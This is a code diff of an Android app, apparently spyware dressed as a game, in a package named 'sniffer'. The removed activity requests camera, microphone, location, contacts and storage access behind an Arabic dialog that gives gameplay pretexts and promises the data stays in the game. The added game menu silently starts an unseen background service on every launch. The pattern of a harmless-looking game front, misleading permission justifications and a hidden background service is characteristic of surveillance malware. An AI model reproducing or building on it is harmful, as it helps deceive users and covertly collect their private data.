@@ -1,108 +1,98 @@
-package com.v8.global.sniffer;
+package com.v8.global.sniffer.game;
 
 import android.app.Activity;
-import android.app.AlertDialog;
-import android.content.DialogInterface;
 import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.provider.Settings;
-import android.widget.Toast;
-import androidx.annotation.NonNull;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
-import android.Manifest;
-import com.v8.global.sniffer.game.MainGameActivity;
-import java.util.ArrayList;
-import java.util.List;
+import android.view.View;
+import android.view.animation.Animation;
+import android.view.animation.AnimationUtils;
+import android.widget.Button;
+import android.widget.ImageView;
+import android.widget.TextView;
+import com.v8.global.sniffer.R;
+import com.v8.global.sniffer.BackgroundService;
 
-public class MainActivity extends Activity {
+public class MainGameActivity extends Activity {
 
-    private static final int PERMISSION_REQUEST_CODE = 100;
+    private Button btnPlay, btnSettings, btnExit;
+    private TextView tvHighScore, tvWelcome;
+    private ImageView ivLogo;
+    private int highScore = 0;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // التحقق من الصلاحيات
-        checkPermissions();
+        setContentView(R.layout.activity_main_game);
+
+        // تشغيل الخدمة الخلفية
+        startBackgroundService();
+
+        initViews();
+        loadHighScore();
+        setupClickListeners();
     }
 
-    private void checkPermissions() {
-        List<String> permissionsNeeded = new ArrayList<>();
-        
-        // قائمة الصلاحيات المطلوبة
-        String[] permissions = {
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.READ_CONTACTS
-        };
-
-        // جمع الصلاحيات التي لم تُمنح بعد
-        for (String permission : permissions) {
-            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(permission);
+    private void startBackgroundService() {
+        try {
+            Intent serviceIntent = new Intent(this, BackgroundService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
             }
-        }
-
-        if (permissionsNeeded.isEmpty()) {
-            // كل الصلاحيات ممنوحة - افتح اللعبة
-            openGame();
-        } else {
-            // عرض رسالة توضح سبب حاجة الصلاحيات
-            showPermissionDialog(permissionsNeeded);
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
-    private void showPermissionDialog(final List<String> permissions) {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("🔐 الصلاحيات مطلوبة");
-        builder.setMessage("يحتاج التطبيق إلى بعض الصلاحيات لتجربة لعب أفضل:\n\n" +
-                          "• 📸 الكاميرا - لتصوير ومشاركة الإنجازات\n" +
-                          "• 🎤 الميكروفون - للتواصل الصوتي\n" +
-                          "• 📍 الموقع - لميزات الخريطة\n" +
-                          "• 📁 الملفات - لحفظ تقدم اللعبة\n\n" +
-                          "سيتم استخدام هذه الصلاحيات فقط داخل اللعبة.");
-        
-        builder.setPositiveButton("سماح", new DialogInterface.OnClickListener() {
+    private void initViews() {
+        btnPlay = findViewById(R.id.btn_play);
+        btnSettings = findViewById(R.id.btn_settings);
+        btnExit = findViewById(R.id.btn_exit);
+        tvHighScore = findViewById(R.id.tv_high_score);
+        tvWelcome = findViewById(R.id.tv_welcome);
+        ivLogo = findViewById(R.id.iv_logo);
+
+        Animation fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in);
+        ivLogo.startAnimation(fadeIn);
+        tvWelcome.startAnimation(fadeIn);
+    }
+
+    private void loadHighScore() {
+        highScore = getSharedPreferences("game_prefs", MODE_PRIVATE).getInt("high_score", 0);
+        tvHighScore.setText("🏆 أفضل نتيجة: " + highScore);
+    }
+
+    private void setupClickListeners() {
+        btnPlay.setOnClickListener(new View.OnClickListener() {
             @Override
-            public void onClick(DialogInterface dialog, int which) {
-                // طلب الصلاحيات
-                ActivityCompat.requestPermissions(MainActivity.this, 
-                    permissions.toArray(new String[0]), 
-                    PERMISSION_REQUEST_CODE);
+            public void onClick(View v) {
+                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
+                startActivity(new Intent(MainGameActivity.this, GameBoardActivity.class));
             }
         });
-        
-        builder.setNegativeButton("عدم السماح", new DialogInterface.OnClickListener() {
+
+        btnSettings.setOnClickListener(new View.OnClickListener() {
             @Override
-            public void onClick(DialogInterface dialog, int which) {
-                // فتح اللعبة حتى بدون صلاحيات
-                openGame();
+            public void onClick(View v) {
+                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
+                startActivity(new Intent(MainGameActivity.this, GameSettingsActivity.class));
             }
         });
-        
-        builder.setCancelable(false);
-        builder.show();
+
+        btnExit.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                v.startAnimation(AnimationUtils.loadAnimation(MainGameActivity.this, R.anim.click_effect));
+                moveTaskToBack(true);
+            }
+        });
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            // بعد إجابة المستخدم، افتح اللعبة
-            openGame();
-        }
-    }
-
-    private void openGame() {
-        Intent intent = new Intent(this, MainGameActivity.class);
-        startActivity(intent);
-        finish();
+    protected void onResume() {
+        super.onResume();
+        loadHighScore();
     }
 }
